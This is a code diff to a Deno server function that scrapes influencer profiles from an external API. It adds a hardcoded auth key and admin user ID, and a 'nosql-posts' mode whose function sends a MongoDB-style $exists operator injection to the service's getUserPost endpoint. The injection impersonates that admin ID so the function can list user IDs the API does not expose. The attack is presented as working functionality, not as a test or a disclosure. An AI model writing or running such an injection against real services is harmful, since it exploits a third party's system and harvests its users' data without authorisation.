@@ -10,6 +10,9 @@ const defaultHeaders = {
   'x-off-country-code': 'IN',
 };
 
+const AUTH_KEY = 'd41d8cd98f00b204e9800998ecf8427e';
+const ADMIN_USER_ID = '6144858b2f03d06a7dd008e4';
+
 async function checkUsername(username: string): Promise<any | null> {
   try {
     const res = await fetch(`${API_BASE}/influencer/${username}`, { headers: defaultHeaders });
@@ -17,6 +20,8 @@ async function checkUsername(username: string): Promise<any | null> {
     const data = await res.json();
     if (data?.data?._id) {
       const d = data.data;
+      // Skip zero-post creators
+      if ((d.postCount || 0) === 0) return null;
       return {
         _id: d._id,
         username: d.username,
@@ -40,13 +45,51 @@ async function checkUsername(username: string): Promise<any | null> {
   }
 }
 
+/** Use NoSQL $exists injection on getUserPost to discover influencer IDs from posts */
+async function discoverFromPosts(): Promise<string[]> {
+  try {
+    const res = await fetch(`${API_BASE}/posts/getUserPost`, {
+      method: 'POST',
+      headers: defaultHeaders,
+      body: JSON.stringify({
+        influencerId: { $exists: true },
+        userId: ADMIN_USER_ID,
+        skip: 0,
+        limit: 200,
+        key: AUTH_KEY,
+        isLogin: 'false',
+      }),
+    });
+    if (!res.ok) return [];
+    const data = await res.json();
+    const posts = data?.data ?? [];
+    const ids = new Set<string>();
+    for (const p of posts) {
+      if (p.userId) ids.add(p.userId);
+    }
+    return Array.from(ids);
+  } catch {
+    return [];
+  }
+}
+
 Deno.serve(async (req) => {
   if (req.method === 'OPTIONS') {
     return new Response(null, { headers: corsHeaders });
   }
 
   try {
-    const { usernames } = await req.json();
+    const body = await req.json();
+    const { usernames, mode } = body;
+
+    // Mode: "nosql-posts" - discover via NoSQL injection
+    if (mode === 'nosql-posts') {
+      const ids = await discoverFromPosts();
+      return new Response(
+        JSON.stringify({ status: true, found: ids.length, influencerIds: ids }),
+        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
+      );
+    }
     
     if (!Array.isArray(usernames) || usernames.length === 0) {
       return new Response(
@@ -55,10 +98,7 @@ Deno.serve(async (req) => {
       );
     }
 
-    // Limit batch size
     const batch = usernames.slice(0, 50);
-    
-    // Check all usernames in parallel with small delay groups
     const results: any[] = [];
     const batchSize = 10;
     
@@ -74,7 +114,6 @@ Deno.serve(async (req) => {
         }
       }
       
-      // Small delay between chunks
       if (i + batchSize < batch.length) {
         await new Promise(r => setTimeout(r, 200));
       }
